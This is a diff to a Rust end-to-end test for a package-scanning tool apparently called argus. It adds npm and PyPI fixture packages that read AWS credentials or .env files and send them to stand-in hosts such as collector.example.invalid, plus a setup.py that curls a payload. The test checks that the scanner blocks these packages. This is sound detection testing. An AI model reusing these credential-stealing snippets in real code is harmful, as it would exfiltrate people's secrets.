@@ -238,6 +238,8 @@ fn introduced(document: &Value) -> BTreeSet<&str> {
 #[test]
 fn admission_replays_real_registry_and_agent_boundaries_without_executing_payloads() {
     const NPM: &str = "argus-e2e-npm";
+    const NPM_CHAIN: &str = "argus-e2e-unknown-chain";
+    const NPM_SPLIT: &str = "argus-e2e-split-capabilities";
     const PYPI: &str = "argus-e2e-pypi";
     const CRATE: &str = "argus-e2e-crate";
 
@@ -273,6 +275,36 @@ fn admission_replays_real_registry_and_agent_boundaries_without_executing_payloa
             ("index.js", b"module.exports = {};"),
         ],
     );
+    let npm_chain = tar_gz(
+        "package",
+        &[
+            (
+                "package.json",
+                br#"{"name":"argus-e2e-unknown-chain","version":"1.0.0"}"#,
+            ),
+            (
+                "index.js",
+                b"const fs = require('fs');\nconst secret = fs.readFileSync('/home/demo/.aws/credentials');\nfetch('https://collector.example.invalid/upload', { method: 'POST', body: secret });\n",
+            ),
+        ],
+    );
+    let npm_split = tar_gz(
+        "package",
+        &[
+            (
+                "package.json",
+                br#"{"name":"argus-e2e-split-capabilities","version":"1.0.0"}"#,
+            ),
+            (
+                "read-config.js",
+                b"require('fs').readFileSync('/home/demo/.env');\n",
+            ),
+            (
+                "status-client.js",
+                b"fetch('https://status.example.invalid/health');\n",
+            ),
+        ],
+    );
     let pypi_base = tar_gz(
         "argus-e2e-pypi-1.0.0",
         &[
@@ -288,7 +320,7 @@ fn admission_replays_real_registry_and_agent_boundaries_without_executing_payloa
         &[
             (
                 "setup.py",
-                b"from setuptools import setup\nimport subprocess\nimport urllib.request\nsubprocess.run(['curl', 'https://payload.example.invalid/install'])\nurllib.request.urlopen('https://payload.example.invalid/stage')\nsetup(name='argus-e2e-pypi', version='2.0.0')\n",
+                b"from setuptools import setup\nfrom pathlib import Path\nimport subprocess\nimport urllib.request\nsecret = Path('/home/demo/.aws/credentials').read_text()\nsubprocess.run(['curl', 'https://payload.example.invalid/install'])\nurllib.request.urlopen('https://payload.example.invalid/stage', data=secret.encode())\nsetup(name='argus-e2e-pypi', version='2.0.0')\n",
             ),
             ("PKG-INFO", b"Name: argus-e2e-pypi\nVersion: 2.0.0\n"),
         ],
@@ -322,6 +354,8 @@ fn admission_replays_real_registry_and_agent_boundaries_without_executing_payloa
     let npm_current_sri = format!("sha512-{}", STANDARD.encode(Sha512::digest(&npm_current)));
     let npm_approval_digest = STANDARD.encode(Sha512::digest(&npm_approval));
     let npm_approval_sri = format!("sha512-{npm_approval_digest}");
+    let npm_chain_sri = format!("sha512-{}", STANDARD.encode(Sha512::digest(&npm_chain)));
+    let npm_split_sri = format!("sha512-{}", STANDARD.encode(Sha512::digest(&npm_split)));
     let pypi_base_sha = fixture_sha256_hex(&pypi_base);
     let pypi_current_sha = fixture_sha256_hex(&pypi_current);
     let crate_base_sha = fixture_sha256_hex(&crate_base);
@@ -342,6 +376,21 @@ fn admission_replays_real_registry_and_agent_boundaries_without_executing_payloa
         routes.insert(format!("/artifacts/{NPM}-1.0.0.tgz"), npm_base);
         routes.insert(format!("/artifacts/{NPM}-2.0.0.tgz"), npm_current);
         routes.insert(format!("/artifacts/{NPM}-3.0.0.tgz"), npm_approval);
+
+        for (name, artifact, integrity) in [
+            (NPM_CHAIN, npm_chain, npm_chain_sri),
+            (NPM_SPLIT, npm_split, npm_split_sri),
+        ] {
+            let artifact_url = format!("{base}/artifacts/{name}-1.0.0.tgz");
+            routes.insert(
+                format!("/{name}"),
+                format!(
+                    r#"{{"name":"{name}","dist-tags":{{"latest":"1.0.0"}},"versions":{{"1.0.0":{{"dist":{{"tarball":"{artifact_url}","integrity":"{integrity}"}}}}}}}}"#
+                )
+                .into_bytes(),
+            );
+            routes.insert(format!("/artifacts/{name}-1.0.0.tgz"), artifact);
+        }
 
         let pypi_base_url = format!("{base}/artifacts/{PYPI}-1.0.0.tar.gz");
         let pypi_current_url = format!("{base}/artifacts/{PYPI}-2.0.0.tar.gz");
@@ -402,6 +451,7 @@ fn admission_replays_real_registry_and_agent_boundaries_without_executing_payloa
     );
     let npm_ids = introduced(&npm);
     for expected in [
+        "download-execution-chain",
         "implicit-node-gyp-build",
         "lifecycle-script",
         "remote-download",
@@ -537,6 +587,68 @@ fn admission_replays_real_registry_and_agent_boundaries_without_executing_payloa
     assert_eq!(approved["reports"][0]["decision"], "allow-with-approval");
     assert_eq!(approved["approvals"][0]["complete"], true);
 
+    let unknown_chain = json(
+        &argus(&[
+            "fetch",
+            &format!("{NPM_CHAIN}@1.0.0"),
+            "--registry",
+            &registry.base_url,
+            "--format",
+            "json",
+        ]),
+        1,
+    );
+    assert_eq!(unknown_chain["decision"], "block");
+    let chain_findings = unknown_chain["findings"]
+        .as_array()
+        .expect("chain findings");
+    for expected in [
+        "credential-access",
+        "network-exfiltration",
+        "credential-exfiltration-chain",
+    ] {
+        assert!(
+            chain_findings
+                .iter()
+                .any(|finding| finding["rule_id"] == expected),
+            "unknown chain findings: {chain_findings:?}"
+        );
+    }
+    let chain = chain_findings
+        .iter()
+        .find(|finding| finding["rule_id"] == "credential-exfiltration-chain")
+        .expect("credential exfiltration chain");
+    assert_eq!(chain["capability"], "secret_exfiltration");
+    assert_eq!(chain["resolved_host"], "collector.example.invalid");
+    assert_eq!(chain["evidence"].as_array().map(Vec::len), Some(2));
+
+    let split_capabilities = json(
+        &argus(&[
+            "fetch",
+            &format!("{NPM_SPLIT}@1.0.0"),
+            "--registry",
+            &registry.base_url,
+            "--format",
+            "json",
+        ]),
+        1,
+    );
+    assert_eq!(split_capabilities["decision"], "block");
+    let split_findings = split_capabilities["findings"]
+        .as_array()
+        .expect("split findings");
+    for expected in ["credential-access", "network-exfiltration"] {
+        assert!(
+            split_findings
+                .iter()
+                .any(|finding| finding["rule_id"] == expected),
+            "split findings: {split_findings:?}"
+        );
+    }
+    assert!(split_findings
+        .iter()
+        .all(|finding| finding["rule_id"] != "credential-exfiltration-chain"));
+
     let uv_base = workspace.path().join("uv.base.lock");
     let uv_current = workspace.path().join("uv.lock");
     let uv_lock = |version: &str, digest: &str| {
@@ -565,6 +677,9 @@ fn admission_replays_real_registry_and_agent_boundaries_without_executing_payloa
     );
     let pypi_ids = introduced(&pypi);
     for expected in [
+        "credential-access",
+        "credential-exfiltration-chain",
+        "download-execution-chain",
         "setup-py-execution",
         "setup-subprocess",
         "setup-remote-download",
@@ -664,6 +779,8 @@ fn admission_replays_real_registry_and_agent_boundaries_without_executing_payloa
         format!("/artifacts/{NPM}-1.0.0.tgz"),
         format!("/artifacts/{NPM}-2.0.0.tgz"),
         format!("/artifacts/{NPM}-3.0.0.tgz"),
+        format!("/artifacts/{NPM_CHAIN}-1.0.0.tgz"),
+        format!("/artifacts/{NPM_SPLIT}-1.0.0.tgz"),
         format!("/artifacts/{PYPI}-1.0.0.tar.gz"),
         format!("/artifacts/{PYPI}-2.0.0.tar.gz"),
         format!("/api/v1/crates/{CRATE}/1.0.0/download"),
